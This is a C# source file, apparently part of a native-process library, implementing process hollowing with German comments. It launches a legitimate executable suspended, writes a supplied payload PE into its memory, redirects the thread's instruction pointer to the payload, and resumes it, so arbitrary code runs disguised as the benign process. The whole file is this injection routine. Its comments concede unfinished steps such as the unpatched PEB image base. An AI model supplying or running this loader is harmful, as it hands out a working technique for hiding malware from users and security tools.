using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using NativeProcesses.Core.Native;
using NativeProcesses.Core.PE;

namespace NativeProcesses.Core.PE.Loader
{
    public static class ProcessHollower
    {
        #region P/Invoke
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // Context Flags
        private const uint CONTEXT_i386 = 0x00010000;
        private const uint CONTEXT_CONTROL_386 = CONTEXT_i386 | 0x00000001; // SS:SP, CS:IP, FLAGS, BP
        private const uint CONTEXT_AMD64 = 0x00100000;
        private const uint CONTEXT_CONTROL_64 = CONTEXT_AMD64 | 0x00000001; // RIP, RSP...

        // Einfache Context Strukturen (wir brauchen nur IP/RIP und ImageBase Register)
        // Wir nutzen Marshaling mit Offsets, um komplexe Structs zu vermeiden.
        // x64: RCX ist oft ImageBase, RDX ist EntryPoint? Nein, PEB ist in RDX.
        // Wir ändern den Instruction Pointer (RIP/EIP) und das ImageBase Register (RDX/EBX).
        #endregion

        /// <summary>
        /// Startet einen Prozess suspended, höhlt ihn aus und injiziert die Payload.
        /// </summary>
        /// <param name="targetPath">Pfad zur legitimen EXE (Dummy).</param>
        /// <param name="payload">Die Payload (EXE/DLL), die ausgeführt werden soll.</param>
        public static int CreateHollowedProcess(string targetPath, byte[] payload)
        {
            // 1. Prozess Suspended starten
            var si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();

            // CREATE_SUSPENDED = 0x00000004
            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
            {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateProcess failed.");
            }

            // SafeHandle Wrapper für automatische Bereinigung bei Fehler, aber wir brauchen Raw Handles hier.
            // Wir nutzen ManagedProcess für Hilfsfunktionen.
            using (var proc = new ManagedProcess(pi.dwProcessId, ProcessAccessFlags.All))
            {
                try
                {
                    bool is64Bit = proc.GetIsWow64() == false; // Annahme: Target ist 64-bit auf 64-bit OS

                    // 2. Payload Mappen (Lokal)
                    byte[] virtualPe = PeLoader.MapRawToVirtual(payload);

                    // Headers parsen für EntryPoint
                    PeLoader.GetImageBase(virtualPe, out ulong preferredBase, out _);
                    int e_lfanew = BitConverter.ToInt32(virtualPe, 0x3C);
                    int optHeaderOffset = e_lfanew + 24;
                    uint entryPointRva = BitConverter.ToUInt32(virtualPe, optHeaderOffset + 16); // AddressOfEntryPoint (32/64 gleich)

                    // 3. Unmap Original Image (Optional, aber sauberer)
                    // Wir müssen die BaseAddress des Zielprozesses kennen (PEB).
                    // Einfachheitshalber versuchen wir NtUnmapViewOfSection auf die Standard-Adresse der Ziel-EXE.
                    // Aber Hollowing funktioniert besser, wenn wir einfach NEUEN Speicher allocaten und den Thread umbiegen.

                    // 4. Remote Allocation & Injection (Nutzt unsere RemotePeLoader Logik teilweise)
                    // Wir nutzen ManagedProcessExtensions.

                    // Wir versuchen, an der PreferredBase zu allozieren (Image Stomping), 
                    // oder einfach irgendwo (Relocation nötig).
                    IntPtr remoteBase = proc.AllocateMemory(virtualPe.Length);

                    // Relocations anwenden (für die neue RemoteBase)
                    RelocationsFixer.ApplyRelocations(virtualPe, (ulong)remoteBase.ToInt64());

                    // Imports fixen (Lokal aufgelöst -> Remote geschrieben)
                    ImportsFixer.FixImports(virtualPe);

                    // Schreiben
                    proc.WriteMemory(remoteBase, virtualPe);

                    // 5. Thread Context patchen (Das "Hollowing")
                    // Wir müssen den EntryPoint (RIP/EIP) auf unsere neue Adresse setzen (remoteBase + entryPointRva)
                    // UND wir müssen die ImageBase im PEB aktualisieren (RDX/EBX), damit der Loader nicht verwirrt ist.

                    IntPtr entryPointAddress = IntPtr.Add(remoteBase, (int)entryPointRva);
                    UpdateThreadContext(pi.hThread, entryPointAddress, remoteBase, is64Bit);

                    // 6. Resume
                    ResumeThread(pi.hThread);

                    return pi.dwProcessId;
                }
                catch
                {
                    // Bei Fehler Prozess killen
                    try { System.Diagnostics.Process.GetProcessById(pi.dwProcessId).Kill(); } catch { }
                    throw;
                }
            }
        }

        private static void UpdateThreadContext(IntPtr hThread, IntPtr newEntryPoint, IntPtr newImageBase, bool is64Bit)
        {
            IntPtr contextPtr = IntPtr.Zero;
            try
            {
                if (is64Bit)
                {
                    // x64 Context
                    // Size ist ca 1232 bytes, muss 16-byte aligned sein.
                    contextPtr = Marshal.AllocHGlobal(2048);
                    // Alignment sicherstellen
                    IntPtr alignedCtx = (IntPtr)(((long)contextPtr + 15) & ~15);

                    // ContextFlags setzen (Offset 0x30 usually, but lets write at start assuming structure matches)
                    // Wir nutzen einen manuellen Hack für Offsets, da CONTEXT Struktur komplex ist.
                    // P64 Context: Flags @ 0x30.
                    Marshal.WriteInt32(alignedCtx, 0x30, (int)CONTEXT_CONTROL_64);

                    if (!GetThreadContext(hThread, alignedCtx))
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext failed.");

                    // RIP ist Offset 0xF8 (248)
                    Marshal.WriteInt64(alignedCtx, 0xF8, newEntryPoint.ToInt64());

                    // RDX (PEB pointer in x64 start) ist oft ImageBase update target? 
                    // Eigentlich müssen wir das PEB im Speicher patchen (ImageBaseAddress).
                    // Das ist komplexer. Für einfaches Hollowing reicht oft RIP.
                    // Wenn die App ihre eigene ImageBase prüft, müssen wir PEB patchen (siehe unten).

                    if (!SetThreadContext(hThread, alignedCtx))
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext failed.");
                }
                else
                {
                    // x86 Context
                    // Size 716 bytes
                    contextPtr = Marshal.AllocHGlobal(1024);
                    Marshal.WriteInt32(contextPtr, 0x00, (int)CONTEXT_CONTROL_386); // ContextFlags

                    if (!GetThreadContext(hThread, contextPtr))
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext failed.");

                    // EIP ist Offset 0xB8 (184)
                    Marshal.WriteInt32(contextPtr, 0xB8, newEntryPoint.ToInt32());

                    // EBX (Offset 0xA4) zeigt auf PEB bei x86
                    // Auch hier: PEB Patch wäre sauberer.

                    if (!SetThreadContext(hThread, contextPtr))
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext failed.");
                }
            }
            finally
            {
                if (contextPtr != IntPtr.Zero) Marshal.FreeHGlobal(contextPtr);
            }
        }
    }
}